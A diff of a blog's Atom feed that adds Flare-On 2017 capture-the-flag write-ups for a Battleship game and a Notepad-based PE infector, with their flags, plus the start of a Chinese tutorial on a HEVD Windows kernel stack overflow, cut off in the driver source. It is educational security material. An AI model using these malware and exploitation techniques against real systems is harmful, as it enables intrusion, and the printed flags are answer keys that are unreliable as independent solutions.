@@ -4,13 +4,329 @@
  <title>Lynn's Blog</title>
  <link href="http://0.0.0.0:4000/atom.xml" rel="self"/>
  <link href="http://0.0.0.0:4000/"/>
- <updated>2018-08-19T11:44:09+08:00</updated>
+ <updated>2018-08-19T12:08:26+08:00</updated>
  <id>http://0.0.0.0:4000</id>
  <author>
    <name>Lynn Wu</name>
    <email>0x000050@gmail.com</email>
  </author>
 
+ 
+ <entry>
+   <title>2017 Flare-On Challenge 5 pewpewboat.exe</title>
+   <link href="http://0.0.0.0:4000/2018/05/24/2017-Flare-On-5-pewpewboat/"/>
+   <updated>2018-05-24T00:00:00+08:00</updated>
+   <id>http://0.0.0.0:4000/2018/05/24/2017 Flare-On #5 pewpewboat</id>
+   <content type="html">&lt;p&gt;Actually, &lt;code class=&quot;highlighter-rouge&quot;&gt;pewpewboat.exe&lt;/code&gt; is not a Windows	PE file but an x64 ELF binary. When we launch the binary in linux, we can see that is a the Battleship game.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Loading first pew pew map...
+   1 2 3 4 5 6 7 8
+  _________________
+A |_|_|_|_|_|_|_|_|
+B |_|_|_|_|_|_|_|_|
+C |_|_|_|_|_|_|_|_|
+D |_|_|_|_|_|_|_|_|
+E |_|_|_|_|_|_|_|_|
+F |_|_|_|_|_|_|_|_|
+G |_|_|_|_|_|_|_|_|
+H |_|_|_|_|_|_|_|_|
+
+Rank: Seaman Recruit
+
+Welcome to pewpewboat! We just loaded a pew pew map, start shootin'!
+
+Enter a coordinate:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s try to typing some “coordinate” to see what happens. There will be two results: &lt;code class=&quot;highlighter-rouge&quot;&gt;You missed :( &lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nice shot!	Hit!&lt;/code&gt;, if we get all of we need to hit coordinate, we can get message &lt;code class=&quot;highlighter-rouge&quot;&gt;sunk all the ships&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   1 2 3 4 5 6 7 8
+A |_|_|_|_|_|_|_|_|
+B |_|_|_|X|X|X|X|_|
+C |_|_|_|X|_|_|_|_|
+D |_|_|_|X|_|_|_|_|
+E |_|_|_|X|X|X|X|_|
+F |_|_|_|X|_|_|_|_|
+G |_|_|_|X|_|_|_|_|
+H |_|_|_|_|_|_|_|_|
+
+Rank: Seaman Recruit
+
+Nice shot! Hit!
+You sunk all the ships!!
+
+
+NotMd5Hash(&quot;BNKM&quot;) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we need to typing something in last line &lt;code class=&quot;highlighter-rouge&quot;&gt;NotMd5Hash(&quot;BNKM&quot;) &amp;gt;&lt;/code&gt;, when we try a few times, we can know the letters inside the quotation mark is random. So we can patch the verification method, in order for us to continue to the next game.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Analysis:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can install “gdbserver” tool in ubuntu, and bind ip in &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;. Thus we can dynamically debug with IDA Pro.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x403530&lt;/code&gt; function for &lt;code class=&quot;highlighter-rouge&quot;&gt;notmd5hash&lt;/code&gt;, in this function we can find words and &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v7 = 'N';
+  v8 = 'o';
+  v9 = 't';
+  v10 = 'M';
+  v11 = 'd';
+  v12 = '5';
+  v13 = 'H';
+  v14 = 'a';
+  v15 = 's';
+  v16 = 'h';
+  v17 = '(';
+  v18 = '&quot;';
+  v19 = '%';
+  v20 = 's';
+  v21 = '&quot;';
+  v22 = ')';
+  v23 = ' ';
+  v24 = '&amp;gt;';
+  v25 = ' ';
+  v26 = '\0';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After we patch &lt;code class=&quot;highlighter-rouge&quot;&gt;0x403BE0 call sub_403530&lt;/code&gt;, we can make the position guess of the coordinates more smoothly, or reversing to find the correct coordinates in the binary.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Solutions:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I once also solved a challenge about Battleship game, the challenge name was &lt;a href=&quot;http://0x00.tw/2017/08/26/2017-HITCON-CMT-mini-wargame/&quot;&gt;winmine.exe&lt;/a&gt;, one of challenge in HITCON CMT 2017 mini wargame. At that time, I reverse to find correct coordinates in binary. After the game, someone provided a different solution for me, I think this solution is very interesting. That is using &lt;a href=&quot;https://www.vmware.com/tw/products/workstation-pro.html&quot;&gt;vmware workstation snapshot&lt;/a&gt; to remember the game screen that has been marked.&lt;/p&gt;
+
+&lt;p&gt;We collect letters every turn, when we sunk all the ships, we got the those letters from game screen.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;F
+H
+G
+U
+Z
+R
+E
+J
+V
+O
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Reaching the final level, we got those message&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You sunk all the ships!!                                                                                                                                                                                          │
+   1 2 3 4 5 6 7 8                                                                                                                                                                                                │
+A |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+B |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+C |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+D |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+E |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+F |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+G |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+H |_|_|_|_|_|_|_|_|                                                                                                                                                                                               │
+                                                                                                                                                                                                                  │
+Rank: Congratulation!                                                                                                                                                                                             │
+                                                                                                                                                                                                                  │
+Aye!PEWYouPEWfoundPEWsomePEWlettersPEWdidPEWya?PEWToPEWfindPEWwhatPEWyou'rePEWlookingPEWfor,PEWyou'llPEWwantPEWtoPEWre-orderPEWthem:PEW9,PEW1,PEW2,PEW7,PEW3,PEW5,PEW6,PEW5,PEW8,PEW0,PEW2,PEW3,PEW5,PEW6,PEW1,PEW4.
+PEWNextPEWyouPEWletPEW13PEWROTPEWinPEWthePEWsea!PEWTHEPEWFINALPEWSECRETPEWCANPEWBEPEWFOUNDPEWWITHPEWONLYPEWTHEPEWUPPERPEWCASE.                                                                                  │
+Thanks for playing!                        
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After we delete “PEW” words, we can get real messages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Aye! You found some letters did ya? To find what you're looking for, you'll want to
+re-order them:
+9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4.
+
+Next you let 13 ROT in the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE.
+
+Thanks for playing!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;According this message to re-order we collect letters &lt;code class=&quot;highlighter-rouge&quot;&gt;FHGUZREJVO&lt;/code&gt;. The result is &lt;code class=&quot;highlighter-rouge&quot;&gt;OHGJURERVFGUREHZ&lt;/code&gt;. Next, let “ROT13” the string to become &lt;code class=&quot;highlighter-rouge&quot;&gt;BUTWHEREISTHERUM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   1 2 3 4 5 6 7 8
+A |_|_|_|_|_|_|_|_|
+B |_|_|_|_|_|_|_|_|
+C |_|_|_|_|_|_|_|_|
+D |_|_|_|_|_|_|_|_|
+E |_|_|_|_|_|_|_|_|
+F |_|_|_|_|_|_|_|_|
+G |_|_|_|_|_|_|_|_|
+H |_|_|_|_|_|_|_|_|
+
+Rank: Seaman Recruit
+
+Welcome to pewpewboat! We just loaded a pew pew map, start shootin'!
+
+Enter a coordinate: BUTWHEREISTHERUM
+
+ very nicely done!  here have this key:  y0u__sUnK_mY__P3Wp3w_b04t@flare-on.com
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The flag is: &lt;code class=&quot;highlighter-rouge&quot;&gt;y0u__sUnK_mY__P3Wp3w_b04t@flare-on.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;ul&gt;
+  &lt;li&gt;Challenge Author: Tyler Dean (@spresec)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/05_Pewpewboat/pewpewboat.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>2017 Flare-On Challenge 4 Notepad.exe</title>
+   <link href="http://0.0.0.0:4000/2018/05/23/2017-Flare-On-4-notepad/"/>
+   <updated>2018-05-23T00:00:00+08:00</updated>
+   <id>http://0.0.0.0:4000/2018/05/23/2017 Flare-On #4 notepad</id>
+   <content type="html">&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt; is a Windows x86 executable, it seems to be a modified version of Microsoft’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt;. Let’s launch this binary and it looks nothing special.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ZtdIJB9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Analysis:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;IDA can properly apply Microsoft’s PDB for &lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt; from Microsoft’s symbol server. But the entry point of executable has been modified to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1013a00&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6KjROey.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1013a00&lt;/code&gt; function, we can see  interesting thing is entry point in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.rsrc&lt;/code&gt; section, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section. And we can see interesting strings: &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; This is hint means you will need the binaries from the “flareon 2016 challenges”. (We can download these files from the &lt;a href=&quot;http://www.flare-on.com/&quot;&gt;official website&lt;/a&gt;), at the same time,  using stack based strings is also one of the skills of malware.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jWZce3e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here we can restore these strings:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\flareon2016challenge
+ImageHlp.dll
+CheckSumMappedFile
+User32.dll
+MessageBoxA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And we can get other strings from “Strings window” in IDA&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\key.bin
+%USERPROFILE%
+\\flareon2016challenge
+where's my key file?
+what's wrong with my key file?
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After that, we can see other one skills of malware: Dynamically loading library modules. we can using IDA dynamically debug to understand those library. This is originally version.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v77 = 0x1013C4E;
+  v6 = sub_10153D0(0x8FECD63F);
+  v89 = sub_1015310(v6, 0x63D6C065);
+  v90 = sub_1015310(v6, 0xA5E1AC97);
+  v91 = sub_1015310(v6, 0x23545978);
+  v93 = sub_1015310(v6, 0x7C0017A5);
+  v94 = sub_1015310(v6, 0x56C61229);
+  v95 = sub_1015310(v6, 0x7B073C59);
+  v96 = sub_1015310(v6, 0xFFD97FB);
+  v109 = sub_1015310(v6, 0x10FA6516);
+  v97 = sub_1015310(v6, 0xE80A791F);
+  v98 = sub_1015310(v6, 0xDF7D9BAD);
+  v99 = sub_1015310(v6, 0xB12C56D7);
+  v100 = sub_1015310(v6, 0xEC0E4E8E);
+  v101 = sub_1015310(v6, 0x7C0DFCAA);
+  v103 = sub_1015310(v6, 0xD3324904);
+  v104 = sub_1015310(v6, 0xB2089259);
+  v105 = sub_1015310(v6, 0xEEB585D8);
+  v106 = sub_1015310(v6, 0x3810CB0F);
+  v107 = sub_1015310(v6, 0xF02A93BE);
+  v108 = sub_1015310(v6, 0xF72A53BA);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First, we follow first line &lt;code class=&quot;highlighter-rouge&quot;&gt;v77 = 0x1013c4e&lt;/code&gt;, that means &lt;code class=&quot;highlighter-rouge&quot;&gt;v77&lt;/code&gt;’s value stored &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;. We can change assembly view to understand it, first line is &lt;code class=&quot;highlighter-rouge&quot;&gt;$+5&lt;/code&gt; also mean &lt;code class=&quot;highlighter-rouge&quot;&gt;$pc+5&lt;/code&gt;. In IDA, &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; is beginning of same instruction (which is not the &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt; which would point to the next instruction). And &lt;code class=&quot;highlighter-rouge&quot;&gt;call $+5&lt;/code&gt; is probably call to next instruction, and next line for &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; address, such usage usually used to write shellcode, it used to get EIP address.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.rsrc:01013C49 call    $+5              //$pc+5
+.rsrc:01013C4E pop     [ebp+var_88]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we can using IDA dynamically debug to get those library’s name.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v77 = 0x1013C4E;                              // $+5
+  user32.dll = sub_10153D0(0x8FECD63F);
+  kernel32_FindFirstFileA = sub_1015310(user32.dll, 0x63D6C065);
+  kernel32_FindNextFileA = sub_1015310(user32.dll, 0xA5E1AC97);
+  kernel32_FindClose = sub_1015310(user32.dll, 0x23545978);
+  kernel32_CreateFileA = sub_1015310(user32.dll, 0x7C0017A5);
+  kernel32_CreateFileMappingA = sub_1015310(user32.dll, 0x56C61229);
+  kernel32_MapViewOfFile = sub_1015310(user32.dll, 0x7B073C59);
+  kernel32_CloseHandle = sub_1015310(user32.dll, 0xFFD97FB);
+  kernel32_ReadFile = sub_1015310(user32.dll, 0x10FA6516);
+  kernel32_WriteFile = sub_1015310(user32.dll, 0xE80A791F);
+  kernel32_GetFileSize = sub_1015310(user32.dll, 0xDF7D9BAD);
+  kernel32_FlushViewOfFile = sub_1015310(user32.dll, 0xB12C56D7);
+  kernel32_LoadLibraryA = sub_1015310(user32.dll, 0xEC0E4E8E);
+  kernel32_GetProcAddress = sub_1015310(user32.dll, 0x7C0DFCAA);
+  kernel32_GetModuleHandleA = sub_1015310(user32.dll, 0xD3324904);
+  kernel32_UnmapViewOfFile = sub_1015310(user32.dll, 0xB2089259);
+  kernel32_ExpandEnvironmentStringsA = sub_1015310(user32.dll, 0xEEB585D8);
+  kernel32_FileTimeToSystemTime = sub_1015310(user32.dll, 0x3810CB0F);
+  kernel32_GetTimeFormatA = sub_1015310(user32.dll, 0xF02A93BE);
+  kernel32_GetDateFormatA = sub_1015310(user32.dll, 0xF72A53BA);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At the end of the entry point’s function, we know the program then proceeds to look for files in &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; that have PE-headers using the &lt;code class=&quot;highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt; / &lt;code class=&quot;highlighter-rouge&quot;&gt;FindNextFileA&lt;/code&gt; API. When it finds an executable file, calling the function at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt; to infect it. This type malware is called &lt;code class=&quot;highlighter-rouge&quot;&gt;PE infector&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt; function, it will be find MZ haeder, PE header, compares timestamp value and infector other PE file. About PE executable format, we can using “010 editor” tool’s PE template &lt;a href=&quot;https://www.sweetscape.com/010editor/templates/&quot;&gt;PETemplate.bt&lt;/a&gt; to assist analysis PE timestamp. At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10146C0&lt;/code&gt;, it compares the compile timestamp value of the PE file that is currently executing against a hard-coded value, then compares the compile timestamp value of the discovered PE against another hard-coded value. This comparison is repeated for several pairs of timestamp values until both are matched. At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt;, the infection code at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x101500B&lt;/code&gt;, it checks for the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8675309&lt;/code&gt; at offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1C&lt;/code&gt; in the PE and does not infect it if found. When infecting, it adds this value to that offset of the PE. This is known as an “infection marker” Make sure the execute file is only infected once.&lt;/p&gt;
+
+&lt;p&gt;When a successful match is found the second timestamp value is converted to a string and printed in a message box and generate &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;. About &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;, we can follow &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10145B0&lt;/code&gt; function, where eight bytes from offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0C&lt;/code&gt; in the PE is appended to a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;. This is first message box pop up.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/R2IiXIW.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Solutions:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So far we know that we need some files that meet the requirements (timestamp) in 2016’s FLARE On challenge. After finding it, put those files in the &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; directory. Next, &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt; will check the timestamp of those files. If it match, the file timestamp value is converted to a string and printed in a message box, and where “eight bytes” from offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0C&lt;/code&gt; in the PE is appended to ` Key .bin` file.&lt;/p&gt;
+
+&lt;p&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014B4B&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014D0A&lt;/code&gt; code block, it used to check the timestamp of the file and write &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt; file, we total need of four files, include the order of file and file timestamp&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Timestamp of infected file&lt;/th&gt;
+      &lt;th&gt;Timestamp of 2016’s FLARE On challenge&lt;/th&gt;
+      &lt;th&gt;challenge name&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x57D1B2A2&lt;/td&gt;
+      &lt;td&gt;0x48025287&lt;/td&gt;
+      &lt;td&gt;(Challenge1) challenge1.exe&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x57D2B0F8&lt;/td&gt;
+      &lt;td&gt;0x57d1b2a2&lt;/td&gt;
+      &lt;td&gt;(Challenge2) DudeLocker.exe&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x49180192&lt;/td&gt;
+      &lt;td&gt;0x57D2B0F8&lt;/td&gt;
+      &lt;td&gt;(Challenge6) khaki.exe&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x579E9100&lt;/td&gt;
+      &lt;td&gt;0x49180192&lt;/td&gt;
+      &lt;td&gt;(Challenge3) unknow&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;The final timestamp value comparison is only performed on the running executable. If it matches, 32 bytes are read from the &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt; file and are XORed against a 32 byte string of unprintable characters stored in a local variable.&lt;/p&gt;
+
+&lt;p&gt;Finally, Running the binaries in this order is challenge 1.exe, DudeLocker.exe, khaki.exe, and unknown. We can get the flag in message box.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bl457_fr0m_th3_p457@flare-on.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;ul&gt;
+  &lt;li&gt;Challenge Author: James T. Bennett (@jtbennettjr)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/04_Notepad/notepad.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>2017 Flare-On Challenge 3 Greektome.exe</title>
@@ -225,6 +541,316 @@ N0t t00 h0t R we? 7ry 4ga1nz plzzz!
 &lt;ul&gt;
   &lt;li&gt;Challenge #1 by Dominik Weber (@Invalid_handle)&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/01_Login/login.html&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Windows Kernel Exploit - Stack Overflow</title>
+   <link href="http://0.0.0.0:4000/2018/01/10/Windows-Kernel-Exploit-Stack-Overflow/"/>
+   <updated>2018-01-10T00:00:00+08:00</updated>
+   <id>http://0.0.0.0:4000/2018/01/10/Windows Kernel Exploit - Stack Overflow</id>
+   <content type="html">&lt;p&gt;本篇以 HEVD 為案例進行實作，HEVD 是由 HackSysTeam 所開發的 Kernel Driver，該專案中包含了許多常見的漏洞，適合想練習 Windows Kernel Exploit 的研究人員練習，藉以用來練習各種漏洞利用方法。本篇以 Windows 7 為範例，本次測試的 Windows 7 沒有 SMEP 與 SMAP 防護機制，相對較簡單，有機會也會在其他版本的 Windows 上練習。&lt;/p&gt;
+
+&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;本篇會省略工作環境的準備，專注於漏洞利用操作的細節&lt;/li&gt;
+  &lt;li&gt;本篇利用的 Windows Driver 為 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSysExtremeVulnerableDriver&lt;/a&gt;，選擇這項資源當作示範的原因是有 Source Code 能參考(更容易理解漏洞)，相關 solution 可以參考 &lt;a href=&quot;https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn&quot;&gt;FuzzySecurity 的 PowerShell Kernel Pwn&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Windows 7 x86 SP1 (Version 6.1.7601)&lt;/li&gt;
+  &lt;li&gt;無 SMEP(supervisor mode execution prevention) 防護機制&lt;/li&gt;
+  &lt;li&gt;無 SMAP(supervisor mode access prevention) 防護機制&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;VMware Workstation 12&lt;/li&gt;
+  &lt;li&gt;Visual Studio 2017&lt;/li&gt;
+  &lt;li&gt;WinDBG&lt;/li&gt;
+  &lt;li&gt;IDA Pro&lt;/li&gt;
+  &lt;li&gt;osrloaderv30&lt;/li&gt;
+  &lt;li&gt;cmd&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;
+
+&lt;p&gt;這是一個在 Windows Kernel Driver 的 StackOverflow 漏洞，接下來將了解該漏洞的細節。&lt;/p&gt;
+
+&lt;p&gt;通常 Windows Kernel Driver 的研究，會先從負責處理 IOCTL 的函數開始看起，可以透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverEntry&lt;/code&gt; 中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;DriverObject -&amp;gt; MajorFunction[IRP_MJ_DEVICE_CONTROL]&lt;/code&gt; 找到，而在 HackSysTeam Driver 中可以透過 control code &lt;code class=&quot;highlighter-rouge&quot;&gt;0x222003&lt;/code&gt; 來觸發 Stack Overflow&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/v26v5uU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;這裡補充一下 &lt;a href=&quot;https://msdn.microsoft.com/zh-tw/library/windows/desktop/aa363216(v=vs.85).aspx&quot;&gt;IOCTL&lt;/a&gt; 的知識，Windows Kernel Driver 的 IOCTL 是 User Mode 與 Kernel Driver 之間溝通的方式，Kernel 與 User 會透過 IOCTL 來進行資料的傳遞，當 Kernel Driver 在處理從 User Mode 傳過來的資料時，若沒有檢查，可能會有問題。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;BOOL WINAPI DeviceIoControl(
+  _In_        HANDLE       hDevice,
+  _In_        DWORD        dwIoControlCode,
+  _In_opt_    LPVOID       lpInBuffer,
+  _In_        DWORD        nInBufferSize,
+  _Out_opt_   LPVOID       lpOutBuffer,
+  _In_        DWORD        nOutBufferSize,
+  _Out_opt_   LPDWORD      lpBytesReturned,
+  _Inout_opt_ LPOVERLAPPED lpOverlapped
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;了解 IOCTL 後，回到原來所討論的漏洞，HackSys Team 有提供 &lt;code class=&quot;highlighter-rouge&quot;&gt;StackOverflow.c&lt;/code&gt; 的 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/StackOverflow.c&quot;&gt;Source Code&lt;/a&gt; ，不妨看 Source Code 相關部分來理解此漏洞&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
+    NTSTATUS Status = STATUS_SUCCESS;
+    ULONG KernelBuffer[2048] = {0};
+
+    PAGED_CODE();
+
+    __try {
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
+
+        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);
+        DbgPrint(&quot;[+] UserBuffer Size: 0x%X\n&quot;, Size);
+        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;amp;KernelBuffer);
+        DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\n&quot;, sizeof(KernelBuffer));
+
+#ifdef SECURE
+        // Secure Note: This is secure because the developer is passing a size
+        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
+        // there will be no overflow
